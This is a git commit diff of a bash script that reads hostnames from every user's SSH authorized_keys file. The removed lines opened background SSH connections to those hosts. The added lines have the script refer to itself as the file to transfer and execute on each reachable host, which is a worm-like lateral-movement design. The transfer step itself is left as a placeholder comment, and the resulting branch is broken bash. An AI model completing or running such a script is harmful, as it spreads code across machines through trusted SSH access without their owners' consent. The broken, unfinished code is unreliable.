fb4e78c4a7ee3590ef5a1555f53a0a3317fcc4e2
Zane Prall <99636457+zaneprall@users.noreply.github.com>
2023-09-27 11:07:13 -0600

    Update AutoAuthorized_keys.sh

--- AutoAuthorized_keys.sh
+++ AutoAuthorized_keys.sh
@@ -1,5 +1,8 @@
 #!/bin/bash
 
+# File to be transferred and executed
+file_to_transfer="$0"
+
 # Loop through each user's home directory
 for dir in /home/*; do
   # Check if .ssh/authorized_keys file exists
@@ -7,10 +10,14 @@ for dir in /home/*; do
     # Extract hostnames from the authorized_keys file
     awk '{print $3}' "$dir/.ssh/authorized_keys" | while read -r hostname; do
       if [[ ! -z "$hostname" ]]; then
-        # Open an SSH connection and leave it open
-        ssh -o BatchMode=yes -o ConnectTimeout=5 -f -N "$hostname" &
-        pid=$!
-        echo "SSH connection to $hostname started with PID $pid"
+        # Check if hostname resolves
+        nslookup "$hostname" &>/dev/null
+        if [[ $? -eq 0 ]]; then
+          # Continue with SSH and SCP operations
+          # ...
+        else
+          echo "Hostname $hostname could not be resolved."
+        fi
       fi
     done
   fi
